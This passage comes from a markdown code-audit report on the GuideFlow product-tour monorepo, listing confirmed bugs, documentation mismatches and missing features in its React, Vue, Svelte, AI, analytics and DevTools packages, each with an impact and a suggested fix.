  [`apps/e2e/playwright.config.ts:31`](../../apps/e2e/playwright.config.ts#L31) · *bug* · CONFIRMED
  <br>**Impact:** All three spec files navigate to `/` (apps/e2e/tests/tour-flow.spec.ts:12, spotlight-persistence.spec.ts:5, accessibility.spec.ts:6) and then click `#start-btn`. At http://localhost:6006/ Storybook serves its manager shell; the only story, apps/storybook/stories/TourFlow.stories.tsx:45, renders its button with no `id` attribute at all, and it lives inside the preview iframe regardless. Meanwhile apps/e2e/fixtures/ind…
  <br>**Fix:** Serve the fixture directory: set `webServer.command` to `pnpm dlx serve fixtures -l 6006` (or add a `vite preview`/`http-server` devDependency to apps/e2e) and keep `baseURL: 'http://localhost:6006'`. The fixture also needs its import path fixed — apps/e2e/fixtures/index.html:22 imports `/node_modules/@guideflow/core/dist/index.js`, which…
- **`release-publishes-without-test-or-lint-gate`** — release.yml publishes to npm after only a build — no lint, no type-check, no tests  
  [`.github/workflows/release.yml:37`](../../.github/workflows/release.yml#L37) · *packaging* · CONFIRMED
  <br>**Impact:** `release.yml` triggers on every push to master (line 5) and on `workflow_dispatch` (line 6), independently of ci.yml. tsup builds with esbuild, which strips types without checking them, so a package with failing `tsc --noEmit` or failing vitest suites builds successfully and is published to npm. Nothing in the job requires ci.yml to have passed — there is no `workflow_run` trigger and no `needs:`. A red CI run and a …
  <br>**Fix:** Insert `pnpm turbo run type-check ...`, `pnpm turbo run lint ...` and `pnpm turbo run test ...` steps between the Build and Create Release PR steps in .github/workflows/release.yml, mirroring ci.yml:37-44. Better still, gate the whole job on CI: `on: workflow_run: workflows: [CI], types: [completed], branches: [master]` plus `if: github.e…

#### Framework adapters (10)

- **`docs-react-guide-six-nonexistent-apis`** — apps/docs/guide/react.md uses six props/config options that do not exist in any shipped type  
  [`apps/docs/guide/react.md:96`](../../apps/docs/guide/react.md#L96) · *docs* · CONFIRMED
  <br>**Impact:** Every code block in the primary React guide fails to compile. (a) line 96 and 101: `stepId` — the prop is `id` (TourStep.tsx:15). (b) lines 113-118: `<GuidePopover stepId title body placement>` — `GuidePopoverProps` has only `width`/`children`/`className`. (c) line 82 `useHotspot(ref, { tooltip: '...' })` and line 128 `<HotspotBeacon tooltip="...">` — `HotspotOptions` is `{ title?, body?, placement?, color?, size? }`…
  <br>**Fix:** Correct all six call sites against the real types. The `theme`/`locale` invention also appears at apps/docs/api/vue/guide-flow-plugin.md:20, apps/docs/api/svelte/create-tour-store.md:62 and :82 — fix those too, or add real `theme`/`locale` fields to `GuideFlowConfig` (a `locale` field wiring straight into `i18n.use()` would be genuinely u…
- **`react-guidepopover-drops-actions-html-media`** — <GuidePopover> hardcodes skip/prev/next and ignores step.actions, content.html and step.media, which the core renderer honours  
  [`packages/react/src/components/GuidePopover.tsx:159`](../../packages/react/src/components/GuidePopover.tsx#L159) · *gap* · CONFIRMED
  <br>**Impact:** `Step.actions?: StepAction[]` (core types/index.ts:69) lets a flow define arbitrary labelled buttons whose `action` string is dispatched through `gf.send()` — core's DefaultRenderer implements this at default-renderer.ts:162-190. `<GuidePopover>` never reads `activeStep.step.actions`, so any flow using custom FSM-event buttons renders the wrong three buttons and the branch is unreachable. Likewise `content.html` is s…
  <br>**Fix:** In GuidePopover, map `activeStep.step.actions` to buttons dispatching `gf.send(a.action)` with the same next/prev/skip/end special-casing as core's action handler (core/src/index.ts:179-187), and render `content.html` via `dangerouslySetInnerHTML` only after routing it through a shared exported sanitizer (export core's `_sanitizeHTML` so …
- **`react-guidepopover-ignores-instance-i18n`** — <GuidePopover> reads the module-global defaultI18n, so gf.i18n.use()/register() has no effect on its strings  
  [`packages/react/src/components/GuidePopover.tsx:49`](../../packages/react/src/components/GuidePopover.tsx#L49) · *bug* · CONFIRMED
  <br>**Impact:** `createGuideFlow` builds a *fresh* registry per instance (`const i18n = new I18nRegistry()`, core/src/index.ts:162) and exposes it as `gf.i18n`, while `defaultI18n` is a separate module singleton (core/src/i18n/index.ts:64). GuidePopover binds to the singleton, so the documented workflow — `gf.i18n.register('fr', {...}); gf.i18n.use('fr')`, exactly what apps/demo/src/main.tsx:30-47 and apps/demo/src/App.tsx:214 do — …
  <br>**Fix:** Change line 49 to `const i18n = gf.i18n` and add a re-render trigger on locale change (either have `I18nRegistry.use()` emit an event the popover subscribes to, or expose an `activeLocale` that GuidePopover keys off). Apply the identical fix to core's DefaultRenderer, which has the same bug at default-renderer.ts:157 (`const i18n = defaul…
- **`react-guidepopover-position-flash-and-no-scroll-tracking`** — <GuidePopover> positions in useEffect (paints at 0,0 for a frame) and never tracks scroll, contradicting its own API doc  
  [`packages/react/src/components/GuidePopover.tsx:101`](../../packages/react/src/components/GuidePopover.tsx#L101) · *bug* · CONFIRMED
  <br>**Impact:** Two defects. (1) `position` initialises to `{ x: 0, y: 0, placement: 'bottom' }` (line 48) and is corrected in a passive `useEffect`, which runs *after* the browser paints — so every step transition flashes the popover at the top-left corner of the viewport for one frame before it jumps to the target. Measurement-then-position must run in `useLayoutEffect`. (2) Only `resize` is listened for. apps/docs/api/react/guide…
  <br>**Fix:** Swap both effects to `useLayoutEffect`, and add `window.addEventListener('scroll', updatePosition, { passive: true, capture: true })` (capture so scrolls inside scroll containers are caught) alongside resize — mirroring what `HotspotManager` already does correctly at core/src/engine/hotspot.ts:119-121. Delete or implement the scroll-track…
- **`react-guidepopover-stays-visible-after-pause`** — <GuidePopover> does not subscribe to tour:pause, so gf.pause() hides the core popover but leaves the React one on screen  
  [`packages/react/src/components/GuidePopover.tsx:73`](../../packages/react/src/components/GuidePopover.tsx#L73) · *bug* · CONFIRMED
  <br>**Impact:** `TourEngine.pause()` (core/src/engine/tour.ts:167-175) calls `this._spotlight.hide()` and `this._renderer.hideStep()` and emits only `tour:pause` — it deliberately does *not* emit `step:exit` so the flow position is preserved. GuidePopover, `<TourStep>` (TourStep.tsx:36-39) and `useTourStep` (use-tour-step.ts:35-42) all key off `step:exit`/`tour:abandon`/`tour:complete` and none of them listen to `tour:pause`. Result…
  <br>**Fix:** Add `gf.on('tour:pause', () => setActiveStep(null))` and `gf.on('tour:resume', ...)` handling to GuidePopover, TourStep and useTourStep. Then expose pause/resume properly across all three adapters (see the pause/resume parity finding).
- **`react-no-use-client-boundary`** — packages/react/src contains no 'use client' directive while the docs claim Next.js App Router support  
  [`packages/react/src/context.tsx:6`](../../packages/react/src/context.tsx#L6) · *packaging* · CONFIRMED
  <br>**Impact:** apps/docs/guide/index.md:36 states "**SSR safe** — every DOM access is guarded; works in Next.js App Router, Nuxt, and SvelteKit". `grep -rn "use client" packages/react/src/` returns nothing, and the tsup banner (packages/react/tsup.config.ts) emits only `/* @guideflow/react — MIT License */`. Importing `TourProvider`, `useTour`, or any component from a Next.js App Router Server Component fails the build with "You're…
  <br>**Fix:** Add `'use client'` as the first line of every file under packages/react/src (or emit it via `banner: { js: "'use client';" }` in tsup.config.ts — note tsup strips top-of-file directives during bundling, so the banner is the reliable route). Add an apps/docs/guide/nextjs.md showing the client-boundary wrapper pattern for TourProvider in a …
- **`react-provider-never-destroys-instance`** — TourProvider never calls instance.destroy() — a document-level keydown listener and the popover DOM survive unmount  
  [`packages/react/src/context.tsx:34`](../../packages/react/src/context.tsx#L34) · *bug* · CONFIRMED
  <br>**Impact:** There is no `useEffect(() => () => gf.destroy(), [gf])`. When a tour is active, core has attached `document.addEventListener('keydown', this._keyboardHandler)` (core/src/engine/tour.ts:343) which maps ArrowRight/ArrowDown to `next()` and Escape to `skip()`, and DefaultRenderer has appended a `div.gf-popover` to `document.body`. Unmounting the provider mid-tour (route change in an SPA, a modal that hosts its own provi…
  <br>**Fix:** In context.tsx, add `useEffect(() => { if (instance) return; return () => gf.destroy() }, [gf, instance])` so provider-owned instances are destroyed but caller-supplied ones are left alone. Add a regression test that unmounts the provider mid-tour and asserts the keydown handler no longer advances the flow.
- **`react-useid-breaks-react-17`** — GuidePopover calls useId(), which does not exist in React 17 — a version inside the declared peer range  
  [`packages/react/src/components/GuidePopover.tsx:51`](../../packages/react/src/components/GuidePopover.tsx#L51) · *bug* · CONFIRMED
  <br>**Impact:** packages/react/package.json:61 declares `"react": "^17.0.0 || ^18.0.0 || ^19.0.0"`. `useId` was introduced in React 18; on React 17 the named import resolves to `undefined` and rendering `<GuidePopover>` throws `TypeError: useId is not a function`. The same range problem applies to the `React.JSX.Element` return annotations used across context.tsx:27, GuidePopover.tsx:44, TourStep.tsx:30 and ConversationalPanel.tsx:4…
  <br>**Fix:** Either drop `^17.0.0` from the peerDependencies range (React 17 support is unverifiable without a matrix job), or replace `useId()` with a module-local counter fallback (`const useIdCompat = React.useId ?? (() => useMemo(() => `gf-${++counter}`, []))`) and switch return annotations to the global `JSX.Element`. Add a CI job that installs r…
- **`svelte-no-components-no-tests`** — @guideflow/svelte ships zero components and zero tests, and has no test script at all  
  [`packages/svelte/package.json:49`](../../packages/svelte/package.json#L49) · *test-coverage* · CONFIRMED
  <br>**Impact:** The whole adapter is one 123-line `src/index.ts` and there is no `test` script, no `vitest.config.ts`, and no test files — so `turbo run test` silently skips the package entirely (it has no `test` task to run) and the store contract, the `'isActive' in configOrInstance` instance-vs-config discrimination at index.ts:64, and the `destroy()` cleanup path have never been executed by CI. The package description (`"GuideFl…
  <br>**Fix:** Add `vitest` + `@testing-library/svelte` devDeps and a `test` script to packages/svelte/package.json, with tests covering: config-vs-instance discrimination, that each readable emits on `step:enter`/`step:exit`/`tour:*`, that `destroy()` removes all five listeners and calls `gf.destroy()`, and that `subscribe` returns a working unsubscrib…
- **`vue-no-components-shipped`** — @guideflow/vue ships zero components while its package description, docs and npm metadata promise them  
  [`packages/vue/package.json:4`](../../packages/vue/package.json#L4) · *missing-implementation* · CONFIRMED
  <br>**Impact:** `packages/vue/src` contains only `index.ts`, `plugin.ts` and `composables/use-tour.ts`; `packages/vue/src/index.ts:26` exports nothing but the plugin, the composable and re-exported core types. There is no Vue equivalent of `<GuidePopover>`, `<TourStep>`, `<HotspotBeacon>` or `<ConversationalPanel>`, and no `@vitejs/plugin-vue` entry in tsup.config.ts (so the build cannot even compile a `.vue` file). The description …
  <br>**Fix:** Either correct the description to "composables and plugin" (matching apps/docs/packages/vue.md, which already says that) and state the components gap explicitly in the Vue guide, or add `GfPopover.vue`/`GfTourStep.vue`/`GfHotspotBeacon.vue` plus the `@vitejs/plugin-vue` tsup pipeline needed to build them. Also add `useHotspot`/`useHints`/…

#### AI package (8)

- **`anthropic-default-model-retired`** — AnthropicProvider defaults to a Claude model whose retirement date has passed  
  [`packages/ai/src/providers/anthropic.ts:29`](../../packages/ai/src/providers/anthropic.ts#L29) · *bug* · PLAUSIBLE
  <br>**Impact:** `claude-3-haiku-20240307` is deprecated with a retirement date of 2026-04-19; that date is now past, so the id returns HTTP 404 `not_found_error`. A user who follows the documented setup — `createAI(new AnthropicProvider({ apiKey }), gf)` with no `model` override — gets a 404 on every single call. In `generateSteps` the SDK error propagates out of `complete()` before the `try` around `JSON.parse`, so `brain.generate(…
  <br>**Fix:** Change the default to a current id (`claude-haiku-4-5` for the cheap/fast tier the comment intends, or `claude-opus-5`), update the `/** Default: claude-3-haiku-20240307 */` JSDoc on line 13, and update the two docs tables that repeat the stale value (apps/docs/guide/ai.md:15, apps/docs/api/ai/providers.md:52). Add a CI check or a note in…
- **`brain-unhandled-rejection`** — Debounced detectIntent produces an unhandled promise rejection on every provider failure  
  [`packages/ai/src/brain.ts:180`](../../packages/ai/src/brain.ts#L180) · *bug* · CONFIRMED
  <br>**Impact:** `detectIntent()` re-throws after emitting: `this.emit('error', error); throw error;` (brain.ts:190-194). The `void` operator discards the promise without attaching a rejection handler, so every failed call becomes an unhandled promise rejection. With an expired key, a rate limit, a network blip, or the retired Anthropic default model (see `anthropic-default-model-retired`), a watching user generates one unhandled rej…
  <br>**Fix:** Change line 180 to `this.detectIntent().catch(() => { /* already emitted via 'error' */ });`, or split the internal path from the public one: have a private `_detectIntent()` that emits and resolves, called by `scheduleDetect`, and keep the throwing behaviour only on the public `detectIntent()` that a caller awaits. Add a test that assert…
- **`intent-never-wired-to-flows`** — Behavioural intent is never connected to auto-triggering a flow anywhere in the repo  
  [`README.md:22`](../../README.md#L22) · *missing-implementation* · CONFIRMED
  <br>**Impact:** README.md:22 and apps/docs/guide/ai-intent.md:8 ("automatically surfacing the right tour at the right moment") promise behaviour-triggered tours, but nothing in the codebase closes the loop. `GuideBrain` emits `intent:detected` and stops; `createAI` (index.ts:59-77) wires only `destroy`, never a listener that calls `instance.start()`. Grepping the whole repo for `watch()`, `detectIntent`, and `compress` outside packa…
  <br>**Fix:** Either implement it or stop claiming it. To implement: add an opt-in `GuideBrainOptions.intentTriggers?: Array<{ type: IntentSignal['type']; minConfidence: number; flow: FlowDefinition | string }>` and have `createAI` subscribe to `intent:detected` and call `instance.start(flow)` when a trigger matches (with a per-flow once-per-session gu…
- **`invalid-llm-selector-aborts-tour`** — An invalid selector from the model aborts the whole tour, or throws uncaught via hotspot()  
  [`packages/ai/src/validation.ts:35`](../../packages/ai/src/validation.ts#L35) · *bug* · CONFIRMED
  <br>**Impact:** `validateSteps` accepts any string as `target` with no syntax check. Tracing where it lands: `TourEngine._resolveTarget` does `document.querySelector(step.target)` (packages/core/src/engine/tour.ts:287), which throws `SyntaxError` on an invalid selector. That call sits inside the `try` in `_renderCurrentStep` (tour.ts:225-273), so the exception is caught — but the handler runs `this.emit('tour:error', ...)` then `thi…
  <br>**Fix:** Validate selectors at the trust boundary: in validation.ts, guard `step.target` with a `isValidSelector(s)` helper (`try { document.querySelector(s); return true } catch { return false }`, short-circuited to `true` when `!isBrowser()`), and do the same for `highlights` in `validateGuidedAnswer` (validation.ts:107-115). Independently harde…
- **`no-json-mode-hand-parsed`** — All three real providers JSON.parse() unconstrained model prose and silently swallow every failure  
  [`packages/ai/src/providers/openai.ts:74`](../../packages/ai/src/providers/openai.ts#L74) · *bug* · CONFIRMED
  <br>**Impact:** The only defence against non-JSON output is the system prompt string `Always respond with valid JSON only — no prose, no markdown fences.` No provider sets OpenAI's `response_format`, Anthropic's `output_config.format`, or Ollama's `format: 'json'`, and no provider strips markdown code fences. LLMs routinely wrap JSON in ```json fences or prepend a sentence; `JSON.parse('```json\n[...]```')` throws, the bare `catch` …
  <br>**Fix:** Set structured output on each provider: `response_format: { type: 'json_schema', json_schema: {...} }` (or at minimum `{ type: 'json_object' }`) in openai.ts:55-63; `output_config: { format: { type: 'json_schema', schema } }` in anthropic.ts:45-50; `format: 'json'` in the Ollama request body at ollama.ts:36-47. Add a shared `stripCodeFenc…
- **`nth-of-type-selector-unscoped`** — Fallback selector `tag:nth-of-type(n)` is unscoped and matches the wrong element document-wide  
  [`packages/ai/src/dom-context.ts:43`](../../packages/ai/src/dom-context.ts#L43) · *bug* · CONFIRMED
  <br>**Impact:** The index is computed relative to the element's own parent, but the returned selector has no ancestor prefix, so it is later resolved with `document.querySelector(step.target)` (packages/core/src/engine/tour.ts:287). For a page with `<nav><button>A</button></nav><main><button>B</button><button>C</button><button>D</button></main>`, button D serializes as `button:nth-of-type(3)`, and `document.querySelector('button:nth…
  <br>**Fix:** Build a scoped selector by walking up to the nearest ancestor with a stable identifier and joining with `>`, e.g. `#app > main > button:nth-of-type(3)`, capped at a few levels. Then verify uniqueness before returning: `document.querySelectorAll(sel).length === 1 && document.querySelector(sel) === el`, falling back to a longer path if not.…
- **`openai-browser-throws`** — Documented browser usage of OpenAIProvider throws before any request is made  
  [`packages/ai/src/providers/openai.ts:50`](../../packages/ai/src/providers/openai.ts#L50) · *bug* · CONFIRMED
  <br>**Impact:** The `openai` SDK (v4+, and 6.33.0 is what is installed under node_modules/.pnpm) refuses to construct in a browser-like environment unless `dangerouslyAllowBrowser: true` is passed — it throws `OpenAIError: It looks like you're running in a browser-like environment.` `dangerouslyAllowBrowser` appears nowhere in the repo (grep across all non-node_modules files returns zero hits). Since GuideFlow is a browser tour libr…
  <br>**Fix:** Add an explicit `allowBrowser?: boolean` option to `OpenAIProviderOptions`/`AnthropicProviderOptions` that maps to the SDKs' `dangerouslyAllowBrowser` flag, defaulting to `false`, and throw a GuideFlow-branded error naming the server-proxy alternative when a browser context is detected without it. Document that the OpenAI/Anthropic provid…
- **`uncapped-llm-calls-per-pause`** — watch() fires an uncapped LLM call on every 2-second user pause with no cooldown, batching or dedup  
  [`packages/ai/src/brain.ts:176`](../../packages/ai/src/brain.ts#L176) · *performance* · CONFIRMED
  <br>**Impact:** `push()` calls `scheduleDetect()` on every click, input, keydown, and scroll event (brain.ts:143, listeners at 159-162). Each 2s (default `intentDebounceMs`) lull therefore issues one full `provider.detectIntent()` round trip. There is no minimum-event threshold (a single stray scroll triggers a call), no cooldown between calls, no batching, and no dedup — and because the buffer is never trimmed after a detect, conse…
  <br>**Fix:** Add to `GuideBrainOptions`: a `minEventsBeforeDetect` threshold (skip the call when fewer than N new events accumulated), a `detectCooldownMs` floor between calls, and a `maxDetectsPerSession`/`maxDetectsPerMinute` cap. Track a high-water mark of already-analyzed events and skip the call when the buffer has not meaningfully changed. Trim …

#### Analytics (10)

- **`docs-analyticsevent-shape-wrong`** — Documented AnalyticsEvent shape contradicts the real type in three of four fields  
  [`apps/docs/api/analytics/transports.md:120`](../../apps/docs/api/analytics/transports.md#L120) · *docs* · CONFIRMED
  <br>**Impact:** The real interface (src/transports/interface.ts:2-9) is `{ event: string; timestamp: string; properties: Record<string, unknown> }`. So: the name field is `event`, not `name`; there is no top-level `userId` (it is buried as `properties.user_id`, collector.ts:108); and `timestamp` is an ISO-8601 string from `new Date().toISOString()` (collector.ts:105), not Unix milliseconds. A backend engineer writing the `/api/analy…
  <br>**Fix:** Correct the block to the real interface, note that the user identifier lives at `properties.user_id`, and state that `timestamp` is ISO-8601. Better: generate this section from `src/transports/interface.ts` rather than hand-maintaining it.
- **`docs-custom-transport-wrong-method`** — The custom-transport example implements send() instead of track(), so a transport built from the docs receives nothing  
  [`apps/docs/api/analytics/transports.md:102`](../../apps/docs/api/analytics/transports.md#L102) · *docs* · CONFIRMED
  <br>**Impact:** `AnalyticsTransport` requires `name: string` and `track(event)` (src/transports/interface.ts:15-28); `AnalyticsCollector.send()` calls `t.track(payload)` (collector.ts:115). The documented class declares neither `name` nor `track`, so `implements AnalyticsTransport` is a hard TypeScript error — and a JavaScript user who copies it registers a transport whose `track` is `undefined`, causing `t.track is not a function` …
  <br>**Fix:** Replace `async send(event)` with `readonly name = 'my-transport'` and `async track(event: AnalyticsEvent): Promise<void>`. Add a compile-checked snippet under apps/docs or a `examples/custom-transport.ts` file included in `type-check` so the example cannot rot again.
- **`docs-nonexistent-events`** — The analytics guide lists three events that are never emitted and omits two that are  
  [`apps/docs/guide/analytics.md:31`](../../apps/docs/guide/analytics.md#L31) · *docs* · CONFIRMED
  <br>**Impact:** grep of packages/analytics/src for the emitted strings gives exactly six: `guideflow.tour.started`, `guideflow.tour.completed`, `guideflow.tour.abandoned`, `guideflow.step.viewed`, `guideflow.step.exited`, `guideflow.step.skipped`. `guideflow.tour.skipped`, `guideflow.step.completed` and `guideflow.step.abandoned` do not exist anywhere in the codebase, and the table omits the two that do (`tour.abandoned`, `step.skip…
  <br>**Fix:** Make apps/docs/guide/analytics.md match the six real names, then either implement `guideflow.step.completed` (emit on a step advanced via next/send rather than skip) or drop it. Publish one canonical event taxonomy page with property tables and a schema version, and have the other three documents link to it instead of restating it.
- **`experiment-correlation`** — With default variant weights, two different experiments assign every user identically (or identically inverted)  
  [`packages/analytics/src/experiments.ts:74`](../../packages/analytics/src/experiments.ts#L74) · *bug* · CONFIRMED
  <br>**Impact:** When `weight` is omitted (the default per line 13, and what src/index.ts:36-40, apps/docs/api/analytics/experiment-engine.md:31-38 and src/__tests__/experiments.test.ts:6-12 all use), two variants give `totalWeight === 2`, so the bucket is `hash % 2` — the low bit of djb2. Because `hash = h*33 ^ charCode`, the low bit reduces to `1 XOR (parity of the low bits of all characters)`, so the bit depends only on the parity…
  <br>**Fix:** Replace djb2 with a well-distributed 32-bit hash (murmur3 or FNV-1a with a final avalanche/mix step) and bucket over a fixed large space rather than `totalWeight`: `const b = hash(userId + ':' + experiment.id) / 0xFFFFFFFF` then walk normalised cumulative weights. Salt each experiment into the mix rather than relying on string concatenati…
- **`full-url-pii-leak`** — Full URL and referrer are exfiltrated on every event with no scrubbing, sampling, or opt-out  
  [`packages/analytics/src/collector.ts:13`](../../packages/analytics/src/collector.ts#L13) · *security* · CONFIRMED
  <br>**Impact:** `window.location.href` includes the query string and fragment. Real applications routinely carry `?email=`, `?token=`, `?reset_key=`, `?invite=`, `?session=`, SAML relay state, and Stripe/PayPal return parameters in URLs, and single-page apps put record identifiers in the path. Every one of these is forwarded verbatim to PostHog/Mixpanel/Amplitude/Segment and any webhook, on every one of the six tracked events, with …
  <br>**Fix:** Add `CollectorOptions.sanitizeUrl?: (url: string) => string` defaulting to origin+pathname only (query and hash stripped), plus `captureReferrer?: boolean` defaulting to false. Add `enabled`/`setEnabled()` and an `optOut()` that persists, honour `navigator.doNotTrack === '1'` unless explicitly overridden, add a `consent?: () => boolean` g…
- **`missing-flow-id-on-step-events`** — All step-level events ship `flow_id: undefined`, making funnel and drop-off analysis impossible  
  [`packages/analytics/src/collector.ts:74`](../../packages/analytics/src/collector.ts#L74) · *bug* · CONFIRMED
  <br>**Impact:** `base(undefined, ...)` hardcodes `flow_id: undefined` for `step.viewed`, `step.exited` and `step.skipped` (lines 74, 79, 82). A product with three tours running produces an undifferentiated stream of step events with no flow attribution, so you cannot build a per-flow funnel, compute step-level completion, or measure where users drop off — the headline claim in apps/docs/guide/index.md:17. Worse, `properties` is spre…
  <br>**Fix:** Store the active flow id from the `tour:start` handler in a private field and pass it to `base()` for every step event; clear it on `tour:complete`/`tour:abandon`. Forward `payload.stepIndex` as `step_index` and `payload.stepIndex` on abandon as `abandoned_at_index`. Add a collector test asserting `flow_id` and `step_index` are set on `gu…
- **`sendbeacon-does-not-exist`** — WebhookTransport docstring promises a navigator.sendBeacon unload fallback that is not implemented anywhere  
  [`packages/analytics/src/transports/webhook.ts:19`](../../packages/analytics/src/transports/webhook.ts#L19) · *missing-implementation* · CONFIRMED
  <br>**Impact:** `grep -rn sendBeacon packages/` returns exactly one hit: this comment. The actual unload path is `this._beforeUnloadHandler = () => void this.flush();` (line 46), an un-awaited async `fetch` with no `keepalive: true` and no `AbortSignal`. Browsers cancel in-flight non-keepalive fetches when the document unloads, so the entire queued batch is destroyed on every page navigation — precisely the case the docstring claims…
  <br>**Fix:** Implement the documented behaviour: in the unload handler, `navigator.sendBeacon(url, new Blob([JSON.stringify(batch)], {type:'application/json'}))` and clear the queue on a `true` return, falling back to `fetch(url, {..., keepalive: true})`. Listen on `pagehide` and `visibilitychange`→`hidden` instead of `beforeunload` (which is unreliab…
- **`seven-core-events-unsubscribed`** — Seven of thirteen TourEvents are never subscribed: pause, resume, error, hotspot open/close, hint click, progress sync  
  [`packages/analytics/src/collector.ts:60`](../../packages/analytics/src/collector.ts#L60) · *gap* · CONFIRMED
  <br>**Impact:** core defines 13 events (packages/core/src/types/index.ts:202-216). The collector wires 6. `hotspot:open`/`hotspot:close` and `hint:click` are the primary always-on engagement surfaces — a product shipping hotspots and hints gets zero analytics on them, so there is no way to know whether anyone ever clicks a beacon. `tour:pause`/`tour:resume` are invisible, `progress:sync` (cross-tab resume) is invisible, and `tour:er…
  <br>**Fix:** Add handlers for the remaining seven events with a documented name mapping (`guideflow.tour.paused`, `guideflow.tour.resumed`, `guideflow.tour.errored`, `guideflow.hotspot.opened`, `guideflow.hotspot.closed`, `guideflow.hint.clicked`, `guideflow.progress.synced`). Drive the subscription table off a single `Record<keyof TourEvents, {name, …
- **`tour-error-reported-as-abandon`** — tour:error is not subscribed, so render failures are reported to analytics as user abandonment  
  [`packages/analytics/src/collector.ts:67`](../../packages/analytics/src/collector.ts#L67) · *bug* · CONFIRMED
  <br>**Impact:** core's render error boundary emits `tour:error` and then immediately calls `_doEnd(false)`, which emits `tour:abandon` (packages/core/src/engine/tour.ts:271-272). The collector subscribes to `tour:abandon` but not `tour:error`, so a step whose `content()` promise rejects, or whose target selector throws, is recorded as `guideflow.tour.abandoned` and is indistinguishable from a user clicking Skip. A tour that is broke…
  <br>**Fix:** Subscribe to `tour:error` and emit `guideflow.tour.errored` with `error_message`/`error_name` (stringify `payload.error` defensively — it is typed `unknown`). Set a flag in that handler so the immediately following `tour:abandon` is emitted with `reason: 'error'` instead of the default `reason: 'user'`.
- **`webhook-no-timeout-latch`** — A hanging fetch permanently latches _flushing, silently disabling the transport and growing the queue without bound  
  [`packages/analytics/src/transports/webhook.ts:70`](../../packages/analytics/src/transports/webhook.ts#L70) · *bug* · CONFIRMED
  <br>**Impact:** There is no `AbortSignal`/timeout on the request. `flush()` guards with `if (this.queue.length === 0 || this._flushing) return;` (line 61) and only clears `_flushing` in `finally`. If the endpoint accepts the connection and never responds (hung load balancer, captive portal, proxy black-hole — the browser default is no timeout at all), `_flushing` stays `true` for the lifetime of the page. Every subsequent `track()` …
  <br>**Fix:** Pass `signal: AbortSignal.timeout(this.opts.requestTimeoutMs ?? 10000)` to `fetch` and add the option. Enforce `maxQueueSize` as a hard cap in `track()` — drop the oldest events (or newest, documented) and increment a `droppedCount` surfaced via a callback. Have `flush()` return the in-flight promise instead of `undefined` when `_flushing…

#### DevTools extension (9)

- **`devtools-port-never-reconnects`** — The DevTools panel connects one port on mount and never handles disconnect or reconnects  
  [`packages/devtools/src/panel/app.tsx:1135`](../../packages/devtools/src/panel/app.tsx#L1135) · *bug* · CONFIRMED
  <br>**Impact:** There is no `port.onDisconnect.addListener` anywhere in app.tsx. When the MV3 service worker is terminated (idle timeout, extension update, crash, or the browser's port-lifetime cap), the port dies and the panel silently stops receiving `GF_DETECTED`, `GF_TOUR_EVENT`, `GF_FLOWS_LIST`, `GF_ELEMENT_SELECTED` and `GF_RECORDED_STEP` forever. The UI shows no change — the green dot stays green and the Events tab just stops…
  <br>**Fix:** Register `port.onDisconnect.addListener(() => { setConnected(false); reconnect(); })` with a backoff-reconnect that re-issues `GF_DEVTOOLS_OPEN`/`GF_PROBE` on success, and surface a visible "reconnecting…" state in the header.
- **`flows-list-clone-failure`** — GF_FLOWS_LIST postMessages raw FlowDefinitions containing functions — silently swallowed on one path, uncaught throw on the other  
  [`packages/devtools/src/bridge.ts:94`](../../packages/devtools/src/bridge.ts#L94) · *bug* · CONFIRMED
  <br>**Impact:** `FlowDefinition.states[*]` carries `onEntry?: (context) => void` and `onExit?: (context) => void` (packages/core/src/types/index.ts:97-99); `Step.content` may be `() => MaybePromise<StepContent>`, `Step.showIf` is a function, `Step.target` may be an `HTMLElement`, and transitions may carry a `guard` function (types/index.ts:57-60, 76-78). None of these survive structured clone, so `postMessage` throws `DataCloneError…
  <br>**Fix:** Serialize flows through a sanitizer before posting: `JSON.parse(JSON.stringify(flows, (k, v) => typeof v === 'function' ? `[fn ${k}]` : v instanceof Element ? `[Element ${v.tagName}]` : v))`. Wrap the `GF_LIST_FLOWS` post in try/catch and post a `GF_FLOWS_ERROR` on failure so the panel can render a real error state instead of an empty lis…
- **`generated-flow-one-step-per-state`** — runTour puts each step in its own state, so the popover always shows "1 of 1" and Back never works  
  [`packages/devtools/src/panel/app.tsx:429`](../../packages/devtools/src/panel/app.tsx#L429) · *bug* · CONFIRMED
  <br>**Impact:** Core computes `totalSteps` as `this.currentSteps.length` — the length of the *current state's* `steps` array (packages/core/src/fsm/machine.ts:61-63) — and passes it to `renderStep(step, content, index, total)` (engine/tour.ts:265). With one step per state, every step renders as "1 of 1" and any progress indicator is permanently full. Worse, `prev()` calls `this._machine.prevStep()`, which returns false at `stepIndex…
  <br>**Fix:** Emit a single state containing all steps: `{ id, initial: 'main', states: { main: { steps: steps.map(...), final: true } } }`. That gives correct `totalSteps`, working `prev()`, and a much smaller flow definition. Reserve multi-state output for when the builder actually supports branching.
- **`load-saved-tour-is-a-stub`** — The "Load" button on every saved tour is a no-op stub — the tour's steps are never loaded into the builder  
  [`packages/devtools/src/panel/app.tsx:1246`](../../packages/devtools/src/panel/app.tsx#L1246) · *missing-implementation* · CONFIRMED
  <br>**Impact:** The parameter is named `_tour` and is never read. Clicking Load switches to the Builder tab and clears the selected element — the saved tour's `steps` are discarded. `BuilderTab` holds `steps` in its own `useState` (app.tsx:340) with no setter prop, so there is no wiring by which a saved tour could ever be loaded. Combined with the fact that the panel's builder state is not persisted, Save is effectively write-only: …
  <br>**Fix:** Lift `steps`/`flowName` out of `BuilderTab` into `App` (or pass `initialSteps`/`onLoad` props), and implement `onLoadSaved={(tour) => { setFlowName(tour.name); setSteps(tour.steps); setTab('builder'); }}`.
- **`mv3-state-dies-on-suspend`** — All per-tab state lives in service-worker module scope and is lost when MV3 suspends the worker; nothing re-detects  
  [`packages/devtools/src/background/service-worker.ts:16`](../../packages/devtools/src/background/service-worker.ts#L16) · *bug* · CONFIRMED
  <br>**Impact:** MV3 terminates an idle service worker after ~30s. `detectedTabs` is populated only by a `GF_DETECTED` message, which the bridge sends on page load or on an explicit `GF_PROBE`. After the worker restarts there is no re-hydration and nothing sends `GF_PROBE` (the popup never does). So: load a GuideFlow page, wait 30 seconds, click the toolbar icon → the popup reports "GuideFlow not detected", Events captured 0, no acti…
  <br>**Fix:** Persist `detectedTabs`/`eventCounts`/`lastEvents`/`activeTours` to `chrome.storage.session` on write and lazily read on message handling, and have the popup send `GF_PROBE` to the content script on mount so detection is re-established rather than assumed lost.
- **`popup-recording-drops-every-step`** — Recording started from the popup discards every captured step — the service worker only forwards them to an open DevTools port  
  [`packages/devtools/src/background/service-worker.ts:150`](../../packages/devtools/src/background/service-worker.ts#L150) · *missing-implementation* · CONFIRMED
